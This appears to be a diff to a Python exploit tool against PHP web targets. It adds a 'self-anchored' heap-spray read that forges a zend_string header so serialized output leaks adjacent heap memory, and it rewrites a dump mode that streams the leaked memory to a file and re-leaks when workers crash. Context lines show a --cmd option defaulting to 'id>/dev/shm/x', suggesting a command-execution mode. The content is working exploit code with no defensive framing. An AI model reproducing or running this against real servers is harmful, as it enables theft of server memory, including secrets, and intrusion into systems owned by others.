@@ -383,38 +383,85 @@ def heap_leak(t: Target, tries=6):
 # --------------------------------------------------------------------------
 # dump mode: stream heap pages around heap_ref; stop on repeated failures
 # --------------------------------------------------------------------------
+def read_via_spray(t: Target, S, off=0x38, L=0x4000, timeout=6):
+    """Self-anchored bleed: our spray string's own bytes become the forged
+    zend_string header. Bucket1 val -> S+off; zend_string len sits at
+    (S+off)+8 = S+0x40 = spray offset 64, which we wrote = L; data starts
+    at (S+off)+0x18 = S+0x50, runs past our 280B string into ADJACENT heap
+    allocations and gets echoed back by serialize. This is php2leak streaming."""
+    spray = bytearray(SPRAY_LEN)
+    for k in range(8):
+        vo = 8 + k * 32
+        struct.pack_into("<I", spray, vo, 0xBBBB0000 + k)
+        struct.pack_into("<I", spray, vo + 8, 0x04)
+    struct.pack_into("<Q", spray, off + 0x10, L & 0xFFFFFFFFFFFFFFFF)
+    # zend_string layout (vendor-proven via their .dynamic anchor trick):
+    # len = *(val+0x10), data = val+0x18. We forge val = S+off, write L into
+    # our own spray at S+off+0x10, and the echoed data runs from S+off+0x18
+    # past the 280-byte string end into adjacent heap allocations.
+    vo = 8 + 1 * 32
+    struct.pack_into("<Q", spray, vo, S + off)
+    struct.pack_into("<I", spray, vo + 8, 0x06)                  # IS_STRING
+    out = t.send(_spray_with(bytes(spray), 1, REF_BASE), timeout=timeout)
+    if out is None:
+        return None
+    idx = out.find(b"a:")
+    if idx < 0:
+        return None
+    out = out[idx:]
+    key = f"i:{SPRAY_COUNT+1};s:".encode()
+    pos = out.find(key)
+    if pos < 0:
+        return None
+    pos += len(key)
+    try:
+        colon = out.index(b":", pos)
+        slen = int(out[pos:colon])
+    except Exception:
+        return None
+    dstart = colon + 2
+    dend = dstart + slen
+    return (slen, out[dstart:dend] if dend <= len(out) else out[dstart:])
+
+
 def mode_dump(t: Target, args):
+    """Bleed: fresh leak -> locate spray slot S -> self-anchored stream."""
+    import phpbleed_chain as chain
+    chain.isstring_read = lambda addr, timeout=5: read_at(t, addr, timeout)
     log(">", f"target acquired :: http://{t.host}:{t.port}{t.path}")
-    heap_ref = heap_leak(t)
-    if not heap_ref:
+    hr = heap_leak(t)
+    if not hr:
         log("x", "heap leak failed (gadget missing or shaping mismatch)")
         return 2
-    log("+", f"LEAKED heap_ref :: 0x{heap_ref:x}")
-    base = args.addr if args.addr else (heap_ref & ~0xFFF)
-    start = base - (args.back_pages * 0x1000)
-    out = open(args.out, "ab") if args.out else sys.stdout.buffer
-    ok_pages = 0
-    fail_run = 0
-    for i in range(args.pages):
-        addr = start + i * 0x1000
-        r = read_at(t, addr + 0x10)
+    log("+", f"LEAKED heap_ref :: 0x{hr:x}")
+    S = chain.find_spray_slot(hr)
+    if S is None:
+        log("x", "spray slot not located")
+        return 2
+    log("+", f"spray anchor S :: 0x{S:x}")
+    out = open(args.out, "wb") if args.out else sys.stdout.buffer
+    total = 0
+    L = args.read_len
+    for pg in range(args.pages):
+        r = read_via_spray(t, S, L=L)
         if r is None:
-            fail_run += 1
-            if fail_run >= 24:
-                log("~", f"unmapped run at 0x{addr:x}, stopping early")
+            log("~", f"stream page {pg}: worker died, re-leaking")
+            hr = heap_leak(t)
+            if not hr:
+                break
+            S = chain.find_spray_slot(hr)
+            if S is None:
                 break
             continue
-        fail_run = 0
         slen, data = r
-        ok_pages += 1
-        if args.out:
-            out.write(data[:0x1000])
-        if i % 16 == 0:
-            log("~", f"stream :: page {i}/{args.pages} @ 0x{addr:x} len={slen}")
-    if args.out:
+        total += slen
+        out.write(data)
+        log("~", f"stream :: chunk {pg+1}/{args.pages} :: {slen} bytes")
+        if slen >= L:      # read hit the requested length fully; can extend
+            L = min(L * 2, 0x100000)
+    if hasattr(out, "close"):
         out.close()
-    log("+", f"DUMP COMPLETE :: {ok_pages} pages -> {args.out} "
-             f"({t.req_count} requests)")
+    log("+", f"BLED {total} bytes -> {args.out} ({t.req_count} requests)")
     return 0
 
 
@@ -667,6 +714,8 @@ def main():
     p.add_argument("--out", default="heap.dump", help="dump output path")
     p.add_argument("--pages", type=int, default=256)
     p.add_argument("--back-pages", type=int, default=64)
+    p.add_argument("--read-len", type=lambda x: int(x, 0), default=0x4000,
+                   help="dump mode: bytes per self-anchored read")
     p.add_argument("--addr", type=lambda x: int(x, 16), default=None)
     p.add_argument("--cmd", default="id>/dev/shm/x")
     p.add_argument("--ce", type=lambda x: int(x, 16), default=None,
